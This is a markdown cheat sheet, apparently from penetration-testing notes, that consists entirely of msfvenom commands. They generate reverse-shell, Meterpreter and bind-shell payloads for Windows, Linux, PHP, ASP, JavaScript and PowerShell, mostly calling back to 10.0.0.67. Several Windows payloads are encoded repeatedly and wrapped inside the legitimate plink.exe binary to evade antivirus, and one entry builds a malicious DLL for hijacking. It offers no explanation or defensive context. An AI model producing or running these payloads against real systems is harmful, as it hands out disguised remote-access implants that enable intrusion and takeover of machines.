# WINDOWS ENCODED PAYLOADS  PORT 443
**====CHANGE. IP. AS. NEEDED.====**

## WINDOWS/SHELL/REVERSE_TCP [PORT 443]
```sh
msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe
```

## WINDOWS/SHELL_REVERSE_TCP (NETCAT x86) [PORT 443]
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe
```

## WINDOWS/SHELL_REVERSE_TCP (NETCAT x64) [PORT 443]
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe
```

## WINDOWS/METERPRETER/REVRESE_TCP (x86) [PORT 443] AT 10.0.0.67:
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe
```

## WINDOWS/METERPRETER/REVRESE_TCP (x64) [PORT 443] AT 10.0.0.67:
```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_64.exe
```

## ---===BIND SHELL, ENCODED, ON PORT 1234===---
```sh
msfvenom -p windows/shell_bind_tcp LHOST=10.0.0.67 LPORT=1234 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o bindshell_1234_encoded_86.exe
```

## Code for encoding:
```sh
msfvenom --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o payload_86.exe
```

================================================================================
# LINUX 
#### LINUX/x86/METERPRETER/REVERSE_TCP
```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=9997 -f elf >reverse.elf
```

# NETCAT
```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.67 LPORT=1234 -f elf >reverse.elf
```
================================================================================

# PHP 
#### PHP/METERPRETER_REVERSE_TCP [PORT 443]
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
## PHP/METERPRETER/REVERSE_TCP [PORT 443]
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## PHP/REVERSE_PHP [PORT 443]
```sh
msfvenom -p php/reverse_php LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> 
shell.php
```
================================================================================

# ASP
#### ASP-REVERSE-PAYLOAD [PORT 443]
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp
```
## OR FOR NETCAT [PORT 443]
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp
```
================================================================================
## Client-Side, Unicode Payload - For use with Internet Explorer and IE
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none
```

- Note: To keep things the same size, if needed add NOPs at the end of the payload.
### A Unicode NOP is - %u9090

# SHELLCODE GENERATION:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=80 EXITFUNC=thread -f python -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai
```

================================================================================
## DLL HiJacking - Windows - x64
```sh
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll
```
================================================================================


```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.47.29 LPORT=4444 -f powershell
```






